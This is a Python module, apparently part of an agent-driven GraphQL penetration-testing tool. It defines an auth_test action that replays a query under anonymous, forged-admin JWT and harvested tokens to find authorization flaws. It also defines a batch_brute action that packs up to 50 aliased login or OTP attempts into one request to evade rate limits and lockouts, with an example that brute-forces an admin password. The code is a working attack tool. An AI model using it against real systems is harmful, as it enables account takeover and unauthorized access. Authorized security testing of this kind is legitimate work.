"""Authorization actions: auth_test (diff one field across identities) and batch_brute."""

from __future__ import annotations

import json
import re
from datetime import datetime, timezone

from . import action
from .context import ActionContext, Result
from ..coverage import bfla_sensitive_fields, high_value_fields
from ..memory import blank_entry, identity_label, primary_root_field
from ..senses import classify_outcome, is_dead

_DATA_CHARS = 1200
_BLOCKED = ("AUTH-BLOCKED", "FAILED", "LOGIN-FAILED", "HTTP401", "HTTP403")
_ACK_KEYS = ("ok", "success", "__typename")


def _is_ack(data: object) -> bool:
    """True if `data` is a bare acknowledgement (ok/success/typename only, no real payload).

    Used to avoid flagging a content-free success response as a data leak.
    """
    if data is True:
        return True
    if not isinstance(data, dict):
        return False
    vals = list(data.values())
    inner = vals[0] if len(vals) == 1 else data
    if inner is True:
        return True
    if isinstance(inner, dict):
        meaningful = [v for k, v in inner.items() if str(k).lower() not in _ACK_KEYS]
        return not any(v not in (None, "", [], {}, False) for v in meaningful)
    return False


@action("auth_test")
def handle_auth_test(ctx: ActionContext, args: dict) -> Result:
    """Run one field as anon / current / forged-admin / harvested tokens and diff the outcomes.

    Auto-records BFLA (sensitive field reachable unauthenticated) and privilege escalation
    (forged token reaches a customer-blocked field) when the outcome pattern matches.
    """
    query = str(args.get("query", "")).strip()
    variables = args.get("variables") if isinstance(args.get("variables"), dict) else {}
    if not query:
        msg = ("auth_test needs {query} - a SINGLE field query/mutation to run under "
               "anonymous / your current token / a forged-admin token and diff the results "
               "(use it on auth-sensitive fields instead of one graphql call).")
        ctx.log(f"[{ctx.step}] {msg}")
        return Result(observation=msg)
    pf = primary_root_field(query) or "?"

    matrix: list[tuple[str, dict]] = [("anon", {})]
    if ctx.identity:
        matrix.append(("current", dict(ctx.identity)))
    forged = ctx.harvested.get("forged_jwt") or []
    if forged:
        matrix.append(("forged-admin", {"Authorization": f"Bearer {forged[-1]}"}))
    cur_vals = " ".join(str(v) for v in ctx.identity.values())
    for tok in (ctx.harvested.get("token") or [])[:2]:
        if tok and tok not in cur_vals:
            matrix.append((f"token:{tok[-6:]}", {"Authorization": f"Bearer {tok}"}))

    rows: list[tuple[str, str, str]] = []
    raw: dict[str, object] = {}
    dead = False
    for label, hdrs in matrix:
        try:
            resp = ctx.client.execute(query, variables, extra_headers=hdrs or None)
        except Exception as e:  # noqa: BLE001
            rows.append((label, "ERROR", str(e)[:60]))
            continue
        status = resp.get("_status_code", 0)
        dead = dead or is_dead(status)
        data = resp.get("data")
        errs = resp.get("errors") or []
        ctx.trace_io(query, variables, resp, label=f"auth_test:{label}")
        raw[label] = data
        outcome = classify_outcome(status, data, errs)
        snip = (json.dumps(data, default=str)[:_DATA_CHARS] if data
                else (str(errs[0].get("message", ""))[:80] if errs else ""))
        rows.append((label, outcome, snip))

    by_label = {label: outcome for label, outcome, _ in rows}
    authed_outcomes = [o for lbl, o, _ in rows if lbl != "anon"]
    finding_type = None

    if (pf in bfla_sensitive_fields(ctx.schema_map)
            and by_label.get("anon") == "DATA"
            and not _is_ack(raw.get("anon"))):
        blocked_note = (" while an authed identity is blocked" if any(o in _BLOCKED for o in authed_outcomes)
                        else "")
        if ctx.record("Broken Function-Level Authorization (sensitive field reachable unauthenticated)",
                      pf, f"`{pf}` returned DATA with NO authentication{blocked_note} - "
                      + "; ".join(f"{lbl}={o}" for lbl, o, _ in rows), 3.0):
            finding_type = "Broken Function-Level Authorization"

    if (pf in high_value_fields(ctx.schema_map)
            and by_label.get("current") in _BLOCKED
            and by_label.get("forged-admin") == "DATA"
            and by_label.get("anon") != "DATA"):
        if ctx.record("Privilege Escalation (forged/elevated token reaches a customer-blocked field)",
                      pf, f"`{pf}` is blocked for the current customer but returned DATA under a forged token "
                      "(and is NOT anonymously reachable)", 3.0):
            finding_type = finding_type or "Privilege Escalation"

    e = ctx.ledger.setdefault(pf, blank_entry(pf, identity_label(ctx.identity), ctx.step))
    e["authmatrix"] = [label for label, _, _ in rows]
    e["attempts"] = e.get("attempts", 0) + 1
    e["step"] = ctx.step
    e["dup_fails"] = 0
    e["last_sig"] = None
    if finding_type:
        e["finding"] = finding_type

    table = " | ".join(f"{label}:{outcome}" for label, outcome, _ in rows)
    detail = next((s for _, o, s in rows if o == "DATA" and s), "")
    head = "⚠ " if finding_type else ""
    obs = f"{head}auth_test {pf} -> {table}" + (f"  data={detail}" if detail else "")
    ctx.interactions.append({"target_node": f"auth_test:{pf}", "reason": "agent_auth_test",
                             "response_status": 0, "score": 0.0,
                             "timestamp": datetime.now(timezone.utc).isoformat()})
    ctx.log(f"[{ctx.step}] {obs}")
    return Result(observation=obs, touched_target=True, is_dead=dead)


@action("batch_brute")
def handle_batch_brute(ctx: ActionContext, args: dict) -> Result:
    """Alias-multiplex one field N times in a single request to bypass per-request rate limits.

    Substitutes each value into the template's {V} placeholder under a distinct alias; refuses
    destructive root fields, and records a rate-limit bypass and/or any successful value.
    """
    template = str(args.get("template", "")).strip()
    valid = [str(v) for v in (args.get("values") or []) if isinstance(v, (str, int, float))]
    raw_n = len(valid)
    values = valid[:50]
    op = str(args.get("op", "mutation")).lower()
    op = op if op in ("query", "mutation") else "mutation"
    if not template or "{V}" not in template or not values:
        msg = ('batch_brute needs {template (containing a {V} placeholder), values:[...]}. '
               'Alias-multiplexes the field N× in ONE request to bypass per-request rate limits / '
               'lockouts (credential/OTP brute-force). e.g. '
               'template:\'login(username:"admin", password:"{V}") { token }\', values:["0000","0001"].')
        ctx.log(f"[{ctx.step}] {msg}")
        return Result(observation=msg)
    root_field = re.match(r"\s*(?:[A-Za-z_]\w*\s*:\s*)?([A-Za-z_]\w*)", template)
    if root_field and re.search(r"delete|remove|drop|purge|wipe|destroy|deactivate|truncate",
                                root_field.group(1), re.IGNORECASE):
        msg = (f"batch_brute REFUSED: '{root_field.group(1)}' looks destructive - "
               "aliasing it N× only amplifies damage, it doesn't brute-force a secret. Target a "
               "login/verify/token field, or send a single destructive op via graphql if intended.")
        ctx.log(f"[{ctx.step}] {msg}")
        return Result(observation=msg)

    def _sub(v: str) -> str:
        # values land inside the template's quotes; escape so a quote/backslash in a
        # candidate can't break the whole batched query.
        return v.replace("\\", "\\\\").replace('"', '\\"')

    parts = " ".join(f"b{i}: {template.replace('{V}', _sub(v))}" for i, v in enumerate(values))
    query = f"{op} {{ {parts} }}"
    try:
        resp = ctx.client.execute(query, None, extra_headers=ctx.identity or None)
    except Exception as e:  # noqa: BLE001
        ctx.log(f"[{ctx.step}] batch_brute ERROR: {str(e)[:120]}")
        return Result(observation=f"batch_brute ERROR: {str(e)[:120]}")
    ctx.trace_io(query, {}, resp, label="batch_brute")
    status = resp.get("_status_code", 0)
    data = resp.get("data") if isinstance(resp.get("data"), dict) else {}
    errs = resp.get("errors") or []
    n = len(values)
    alias_in_data = {k for k in (data or {}) if re.match(r"b\d+$", str(k)) and int(k[1:]) < n}
    alias_in_errpath = {str(e["path"][0]) for e in errs
                        if isinstance(e.get("path"), list) and e["path"]
                        and re.match(r"b\d+$", str(e["path"][0]))}
    processed = len(alias_in_data | alias_in_errpath)
    hits = [values[int(k[1:])] for k in alias_in_data if data.get(k)]
    limited = any(m in json.dumps(errs, default=str).lower()
                  for m in ("too many", "rate limit", "rate-limit", "throttl", "locked", "slow down"))
    # A clean bypass means the server ran EVERY alias; a partial pass means some were
    # rejected (alias cap, validation) and proves nothing about rate limits.
    bypass = processed == len(values) and len(values) >= 2 and status == 200 and not limited
    if bypass:
        ctx.record("Rate-Limit Bypass via Field Aliasing (batched brute-force)", template[:40],
                   f"{processed}/{len(values)} aliased attempts processed in ONE request with no "
                   f"per-request rate limiting (HTTP {status})", 2.5)
    if hits:
        ctx.record("Credential/OTP brute-force hit (aliased batch)", template[:40],
                   f"successful value(s): {hits[:3]}", 3.0)
    head = "⚠ " if (bypass or hits) else ""
    cap_note = (f" | cap 50 reached, {raw_n - 50} value(s) NOT sent - re-run batch_brute with the rest"
                if raw_n > 50 else "")
    obs = (f"{head}batch_brute {op} ×{len(values)} -> processed {processed}/{len(values)}"
           + (f", HITS={', '.join(map(str, hits[:5]))}" if hits else ", no successful value")
           + (" | per-request rate-limit BYPASSED (all aliases ran)" if bypass else "")
           + (" | server rate-limited/locked" if limited else "")
           + cap_note)
    ctx.interactions.append({"target_node": "batch_brute", "reason": "agent_batch_brute",
                             "response_status": status, "score": 0.0,
                             "timestamp": datetime.now(timezone.utc).isoformat()})
    ctx.log(f"[{ctx.step}] {obs}")
    return Result(observation=obs, touched_target=True, is_dead=is_dead(status))
